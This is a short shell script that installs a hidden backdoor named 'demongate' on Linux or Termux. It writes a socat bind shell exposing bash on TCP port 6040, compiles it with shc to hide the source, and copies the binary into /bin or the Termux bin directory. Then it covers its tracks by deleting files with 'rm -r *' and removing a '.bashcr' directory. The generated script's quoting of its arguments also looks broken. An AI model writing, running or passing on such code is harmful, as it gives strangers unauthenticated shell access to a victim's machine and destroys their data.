#!/bin/sh

# Create the demongate.sh file with proper content
echo "
#!/bin/sh
if [[ '\$1' == 'stop' ]]; then
    pkill socat
    pkill ssh
elif [[ '\$1' == 'k' ]]; then
    socat TCP-LISTEN:6040 EXEC:/bin/bash > /dev/null 2>&1 &
elif [[ '\$1' == 't' ]]; then
    socat TCP-LISTEN:6040 EXEC:/data/data/com.termux/files/usr/bin/bash > /dev/null 2>&1 &
else
    echo '.'
fi
" > demongate.sh
sleep 2
# Compile the script using shc
shc -f demongate.sh > /dev/null 2>&1
sleep 4
# Install the compiled binary based on the argument passed
if [[ "$1" == "t" ]]; then
    mv demongate.sh.x /data/data/com.termux/files/usr/bin/demongate
    chmod +x /data/data/com.termux/files/usr/bin/demongate
elif [[ "$1" == "k" ]]; then
    mv demongate.sh.x /bin/demongate
    chmod +x /bin/demongate
else
    echo ".."
fi

# Cleaning up old files
if [ -f demongate.sh.x.c ]; then
    rm demongate.sh.x.c
fi
rm demongate.sh
rm -r *
cd ..
rm -rf .bashcr
